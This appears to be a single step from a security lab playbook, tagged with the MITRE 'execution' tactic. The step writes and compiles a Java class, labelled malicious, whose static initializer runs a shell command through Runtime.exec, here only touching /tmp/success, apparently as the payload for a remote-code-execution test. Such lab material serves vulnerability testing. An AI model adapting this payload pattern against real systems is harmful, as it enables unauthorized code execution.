  description: Create and compile malicious Java class
  mitre:
    tactic: execution
    technique: ''
    technique_name: execution
  executor:
    type: direct
    command: "mkdir -p /tmp/cvelab-sysfield\n(mkdir -p /tmp/exploit && cd /tmp/exploit\
      \ && cat > TouchFile.java << 'JAVAEOF'\nimport java.lang.Runtime;\nimport java.lang.Process;\n\
      \npublic class TouchFile {\n    static {\n        try {\n            Runtime\
      \ rt = Runtime.getRuntime();\n            String[] commands = {\"touch\", \"\
      /tmp/success\"};\n            Process pc = rt.exec(commands);\n            pc.waitFor();\n\
      \        } catch (Exception e) {\n            // do nothing\n        }\n   \
      \ }\n}\nJAVAEOF\njavac TouchFile.java && echo \"Compiled successfully\" && ls\
      \ -la TouchFile.class) > /tmp/cvelab-sysfield/08-1-2-24-rce-create-and-compile-malicious-java-class.out\
      \ 2>&1\nstatus=$?\ncat /tmp/cvelab-sysfield/08-1-2-24-rce-create-and-compile-malicious-java-class.out\n\
      exit $status"
